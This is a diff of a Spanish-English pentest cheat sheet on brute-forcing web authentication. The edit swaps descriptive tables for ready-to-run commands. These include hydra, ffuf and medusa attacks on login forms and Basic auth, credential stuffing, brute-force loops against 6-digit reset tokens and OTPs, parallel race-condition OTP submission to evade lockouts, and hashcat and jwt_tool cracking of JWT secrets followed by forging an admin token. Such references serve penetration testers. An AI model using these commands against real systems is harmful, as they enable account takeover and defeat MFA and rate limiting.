@@ -26,28 +26,21 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Username + password POST | `username=admin&password=PASS` | Standard form. |
-| Email + password POST | `email=user@x&password=PASS` | Common variant. |
-| Multi-step (user → pass) | Two-page flow Microsoft-style | Two requests. |
-| CSRF token required | Get token first, replay in request | Pre-fetch. |
-| Captcha required | Solvable via API (2captcha) | Slow attack. |
-| JS-required submit | Headless browser (Puppeteer/Playwright) | Anti-bot. |
-| Hidden field validation | Pre-fetch hidden field value | Token rotation. |
-| WAF challenge cookie | Browser challenge → cookie | Headless required. |
-| `remember_me` checkbox | Sometimes affects rate limit | Edge. |
-| Bot trap honeypot field | Hidden field — leave empty | Defender trap. |
-| Form action URL diff | `/login` vs `/auth/internal` | Per-form. |
-| Multipart form-data | `Content-Type: multipart/form-data` | Less common. |
-| Login con OTP combinado | Username + password + OTP same form | Single-step MFA. |
-| `redirect_uri` post-success | URL hint of success | Indirect. |
-| Cookie-set requirement | Pre-set cookie required | Stateful. |
-| Referer required | `Referer: https://target/login` | Anti-CSRF. |
+| `hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"` | Form POST brute con failure-string match | Standard. |
+| `hydra -L users.txt -P passwords.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:H=Cookie\: session=XYZ:F=Invalid"` | Form brute con cookie pre-set | Stateful form. |
+| `hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^&csrf=$TOKEN:S=Welcome"` | Form con CSRF token pre-fetched | CSRF-required forms. |
+| `ffuf -w pass.txt -X POST -u 'https://target/login' -d 'user=admin&pass=FUZZ' -fc 401 -mc 200` | ffuf modern brute single user | Quick variant. |
+| `ffuf -w combos.txt:COMBO -X POST -u 'https://target/login' -d 'user=COMBO1&pass=COMBO2'` (con combos.txt formato `user:pass`) | Credential stuffing | Stuffing attack. |
+| `python3 -c "import requests; ..."` con headless browser (Puppeteer) | JS-required submit | Anti-bot apps. |
+| `curl -s https://target/login \| grep -oE 'csrf_token[^"]+"[^"]+"' \| head -1` | Pre-fetch CSRF token | Pre-attack. |
+| `curl -X POST -H "Referer: https://target/login" -d "..." https://target/login` | Referer-required form | Anti-CSRF. |
+| `hydra -L users.txt -P passwords.txt -t 1 -W 5 ...` (slow throttle) | Slow brute para evitar rate limit | Lockout-aware. |
 ^bf-target-login
 
-### Hydra HTTP form attack
+### Hydra HTTP form workflow
 
 ```bash
-# Form POST con failure string match
+# Standard form POST con failure string
 hydra -L users.txt -P passwords.txt \
   target.com http-post-form \
   "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
@@ -56,6 +49,11 @@ hydra -L users.txt -P passwords.txt \
 hydra -L users.txt -P passwords.txt \
   target.com https-post-form \
   "/login:username=^USER^&password=^PASS^:H=Cookie\: session=XYZ:F=Invalid"
+
+# Success-string match (en lugar de failure)
+hydra -L users.txt -P passwords.txt \
+  target.com http-post-form \
+  "/login:user=^USER^&pass=^PASS^:S=Welcome"
 ```
 
 ___
@@ -64,40 +62,15 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| HTTP Basic Auth | `Authorization: Basic base64(user:pass)` | Trivial brute. |
-| HTTP Digest Auth | `Authorization: Digest username=...,response=...` | Hash challenge. |
-| NTLM Auth | `Authorization: NTLM ...` (3-step) | Windows IIS. |
-| Negotiate (Kerberos/NTLM) | `Authorization: Negotiate ...` | Enterprise. |
-| Bearer token | `Authorization: Bearer XXX` | API tokens. |
-| Custom auth header | `X-Auth-Token: XXX` | App-specific. |
-| Cookie-only auth | `Cookie: session=XXX` | Session brute. |
-| API key URL param | `?api_key=XXX` | Old-style. |
-| API key header | `X-API-Key: XXX` | Modern. |
-| HMAC-signed requests | `Signature: HMAC(secret, ...)` | Brute secret. |
-| AWS Signature V4 | Complex sig calc | Specific tooling. |
-| OAuth Bearer | RFC 6750 | Combo OAuth attack. |
-| JWT Bearer | JWT in Authorization | Brute secret + replay. |
-| SAML assertion brute | XML signature | Complex. |
-| Mutual TLS cert | Client cert | Out-of-scope brute. |
-| API gateway tokens | Kong/AWS API GW | Per-vendor. |
+| `hydra -L users.txt -P passwords.txt target.com http-get /admin` | HTTP Basic brute | Basic Auth challenge. |
+| `hydra -L users.txt -P passwords.txt -s 443 target.com https-get /admin` | HTTPS Basic | TLS. |
+| `for p in $(cat passwords.txt); do curl -s -o /dev/null -w '%{http_code}' -u "admin:$p" https://target/admin \| grep -q 200 && echo "FOUND: $p" && break; done` | Bash bulk basic brute | Manual sin Hydra. |
+| `hydra -L users.txt -P passwords.txt -m / target.com http-head` | HEAD method | Faster (no body). |
+| `medusa -h target -U users.txt -P passwords.txt -M http -m DIR:/admin -m AUTH:BASIC` | Medusa alt para Basic | Alt tool. |
+| `crackmapexec http://target/admin -u users.txt -p passwords.txt` | CME HTTP brute (con http module) | Multi-protocol tool. |
+| `curl -H "Authorization: Bearer FUZZ" https://target/api/x` con ffuf | Bearer token brute | Modern API. |
+| `for k in $(cat keys.txt); do curl -s -o /dev/null -w '%{http_code}' -H "X-API-Key: $k" https://target/api/x \| grep -q 200 && echo "FOUND: $k"; done` | Custom API key header brute | App-specific. |
 ^bf-target-basic
-
-### Hydra basic auth
-
-```bash
-# HTTP Basic
-hydra -L users.txt -P passwords.txt target.com http-get /admin
-
-# HTTPS Basic
-hydra -L users.txt -P passwords.txt -s 443 target.com https-get /admin
-
-# Manual base64 brute
-for pass in $(cat passwords.txt); do
-  RESP=$(curl -s -o /dev/null -w '%{http_code}' \
-    -u "admin:$pass" https://target/admin)
-  [ "$RESP" = "200" ] && echo "FOUND: $pass" && break
-done
-```
 
 ___
 
@@ -105,22 +78,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| API key endpoint | `?api_key=FUZZ` | URL param. |
-| Bearer token API | `Authorization: Bearer FUZZ` | Modern API. |
-| Webhook signing secret | HMAC with key brute | Replay attack. |
-| Pre-signed URL token | URL token brute | S3-style. |
-| Reset token random | `?token=FUZZ` en reset link | Predictable tokens. |
-| Magic link token | Email link token brute | Short tokens. |
-| Email verify token | Verification link brute | Account hijack. |
-| 2FA backup code | 8-10 char alphanumeric | Brute viable. |
-| Invitation token | Onboarding link | Pre-acceptance. |
-| Webhook ID | UUID guess if predictable | Sequential. |
-| Session ID brute | Sequential or timestamp-based | Insecure RNG. |
-| Cookie value brute | Sequential session | Old apps. |
-| CSRF token brute | If short/predictable | Edge. |
-| Captcha bypass token | Re-use captcha responses | Cache. |
-| SMS OTP 4-6 digits | 10000 (4-digit) o 1M (6-digit) | Burst attack. |
-| TOTP within drift window | 30s window, 1-2 codes valid | Race. |
+| `ffuf -w keys.txt -u 'https://target/api/?api_key=FUZZ' -fc 401,403 -mc 200` | API key URL param brute | URL-based API key. |
+| `ffuf -w tokens.txt -H "Authorization: Bearer FUZZ" -u https://target/api/me -fc 401 -mc 200` | Bearer token brute | Header-based. |
+| `for code in {000000..999999}; do curl -sI "https://target/reset?email=victim&token=$code" \| grep -q 302 && echo "FOUND $code" && break; done` | 6-digit reset token brute | Predictable token. |
+| `ffuf -w numeric-6-digit.txt -X POST -u https://target/verify -d "token=FUZZ" -fc 400` | Reset/verify token bruteforce | Form-based. |
+| `wfuzz -z range,000000-999999 --hh 1234 https://target/2fa?code=FUZZ` | OTP 6-digit con response-length filter | Standard wfuzz. |
+| `ffuf -w invite-tokens.txt -u https://target/invite/FUZZ -mc 200` | Invitation token brute | URL path token. |
+| `python3 -c "import uuid; [print(uuid.uuid1()) for _ in range(100)]"` y probar UUIDs predecibles | UUIDv1 timestamp-based prediction | Predictable UUID gen. |
+| `for i in {1..10000}; do TOK=$(python3 -c "print(hex($i)[2:])"); curl -sI "https://target/api/?token=$TOK"; done` | Sequential token brute | Sequential issuance. |
 ^bf-target-tokens
 
 ### Reset token brute
@@ -143,38 +108,27 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| 4-digit numeric | 10,000 combinaciones | Trivial sin rate limit. |
-| 6-digit numeric (TOTP) | 1,000,000 combinaciones | Race-based viable. |
-| 8-digit backup code | 10^8 — slow | Wordlist tipo. |
-| Alphanumeric 6-char | 36^6 = 2B | Slow. |
-| Alphanumeric 8-char | 36^8 = 2.8T | Infeasible. |
-| TOTP 30s window | Solo 1-2 codes válidos en cualquier momento | Race. |
-| HOTP counter-based | Counter unknown — brute counter | Edge. |
-| SMS OTP 4-6 digit | Standard | Race + lockout bypass. |
-| Email OTP 6-8 digit | Standard | Slower delivery. |
-| Voice OTP | Same as SMS | Telephony. |
-| Push notification approval | No brute — needs phishing | Out-of-scope. |
-| FIDO2/WebAuthn | Phishing-resistant | Out-of-scope brute. |
-| Biometric | Out-of-scope | Hardware. |
-| Hardware token (YubiKey) | OTP brute possible if no challenge | Race. |
-| Multi-factor combined | Username+pass+OTP same submit | Race + brute combo. |
-| Backup recovery codes | 8-10 chars usually | Slower brute. |
+| `ffuf -w numeric-4-digit.txt -X POST -u https://target/verify-otp -d "code=FUZZ" -H "Cookie: session=$S" -fc 400` | 4-digit OTP brute (10K combos) | Sin rate limit. |
+| `ffuf -w numeric-6-digit.txt -X POST -u https://target/verify-otp -d "code=FUZZ" -H "Cookie: session=$S" -fc 400` | 6-digit OTP brute (1M combos) | Race + slow. |
+| `seq -w 0 9999 \| while read code; do (curl -s -X POST -d "code=$code" -H "Cookie: session=$S" https://target/verify-otp &); done; wait` | Parallel bash brute | Race condition. |
+| Turbo Intruder con `concurrentConnections=1, engine=Engine.BURP2` + payload `0000-9999` | HTTP/2 single-packet OTP brute | Modern race. |
+| Burp Repeater group "Send in parallel single conn" con N requests con codes distintos | Race condition bypass rate limit | Single-packet attack. |
+| `for code in $(seq -w 0 999999); do curl -sI -X POST -d "code=$code" -H "Cookie: session=$S" https://target/verify-otp \| grep -q "200 OK" && echo "FOUND: $code" && break; done` | Sequential 6-digit con early exit | Slow standard brute. |
+| Backup code brute (8 chars alphanumeric): `crunch 8 8 -t %%%%%%%%` luego pipe a ffuf | Backup code brute | Recovery codes. |
 ^bf-target-otp
 
 ### OTP race brute
 
 ```bash
-# Burp Turbo Intruder for parallel OTP submit (race condition)
-# Send 1000 simultaneous requests con codes 000000-000999
-# Si lockout aplica post-fail, race antes del lock = 1000 attempts en window válida
-
-# CLI raw
-for code in {0000..9999}; do
-  curl -s -X POST https://target/verify-otp \
+# Bash parallel 4-digit
+for code in $(seq -w 0 9999); do
+  (curl -s -X POST https://target/verify-otp \
     -d "code=$code" \
-    -H "Cookie: session=$SESS" &
+    -H "Cookie: session=$SESS" &)
 done
 wait
+
+# O Burp Turbo Intruder con concurrentConnections=1, engine=Engine.BURP2
 ```
 
 ___
@@ -183,36 +137,30 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Session ID predictable | Sequential / timestamp | Insecure RNG. |
-| Session ID short | <128 bits entropy | Brute viable. |
-| Session ID encoded | Base64 reveals structure | Decode + manipulate. |
-| JWT HMAC secret weak | hashcat -m 16500 | Common. |
-| JWT alg=none | No brute — direct forge | Combo JWT Attacks. |
-| JWT kid path traversal | `kid: ../../tmp/x` | Combo. |
-| Cookie HMAC secret | Brute via paddings differential | Edge. |
-| CSRF token derivation | If derived from session predictably | Reverse-engineer. |
-| Custom signed token | Inspect for HMAC pattern | App-specific. |
-| Cookie encryption key | AES key brute (if weak) | Padding oracle combo. |
-| Remember-me token | Long-lived, brute viable | Persistent attack. |
-| API HMAC signing key | Replay + brute via signed responses | Custom auth. |
-| Webhook signing | HMAC over payload | Replay. |
-| Reset token HMAC | If structured | Reverse. |
-| OAuth client_secret | If leaked or weak | Combo OAuth. |
-| Refresh token brute | Long-lived persistence | Combo. |
+| `hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt` | JWT HS256 secret brute | Standard. |
+| `python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt` | jwt_tool brute alternative | Quick. |
+| `hashcat -m 16500 -a 3 jwt.txt ?l?l?l?l?l?l?l?l` | Mask attack 8 chars lowercase | Sin wordlist. |
+| `hashcat -m 16500 jwt.txt rockyou.txt -r best64.rule` | Rules mutations | Cobertura ampliada. |
+| `for i in {1..1000000}; do curl -sI -b "session=$(printf '%032d' $i)" https://target/ \| grep -q 200 && echo "FOUND $i"; done` | Sequential session ID brute | Predictable session. |
+| `python3 -c "import base64; print(base64.b64decode('$SESSION_COOKIE'))"` y analyze structure | Decode cookie structure | Pre-brute analysis. |
+| `hashcat -m 1450 hmac-cookie.txt rockyou.txt` (HMAC-SHA256) | Signed cookie HMAC crack | Custom signed cookies. |
+| `python3 -c "import jwt; print(jwt.decode('$JWT', options={'verify_signature':False}))"` | Decode JWT structure | Pre-crack. |
 ^bf-target-session
 
-### JWT secret crack
+### JWT secret crack workflow
 
 ```bash
-# Capture JWT
-JWT="eyJhbG...REST..."
+JWT="eyJhbG..."
 
-# hashcat HMAC crack
+# Hashcat
 echo "$JWT" > jwt.txt
 hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 
-# jwt_tool brute
+# jwt_tool
 python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt
+
+# Si cracked, forge admin JWT
+python3 -c "import jwt; print(jwt.encode({'role':'admin','exp':9999999999}, 'CRACKED_SECRET', 'HS256'))"
 ```
 
 ***
